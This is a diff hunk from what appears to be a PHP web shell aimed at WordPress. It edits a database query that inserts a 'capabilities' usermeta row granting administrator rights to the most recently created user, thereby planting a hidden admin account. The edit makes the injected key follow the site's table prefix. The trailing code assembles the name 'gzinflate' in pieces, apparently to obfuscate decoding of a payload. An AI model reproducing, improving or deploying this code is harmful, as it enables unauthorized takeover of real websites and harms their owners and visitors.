@@ -3510,7 +3510,7 @@ $path = str_replace("\\", "/", $path);
                 $this_res = $nulzhaxor['ID'];
             }
             $meta_value = 'a:1:{s:13:"administrator";s:1:"1";}';
-            $haxorstars = mysqli_query($conn, "INSERT INTO ".$dbprefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, (Select max(id) FROM ".$dbprefix."users), 'wp_capabilities', '".$meta_value."')") or die(mysqli_error($conn));
+            $haxorstars = mysqli_query($conn, "INSERT INTO ".$dbprefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, (Select max(id) FROM ".$dbprefix."users), '".$dbprefix."_capabilities', '".$meta_value."')") or die(mysqli_error($conn));
             if ($haxorstars) {
                 function dKvVC($SMfPy) {
                     $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
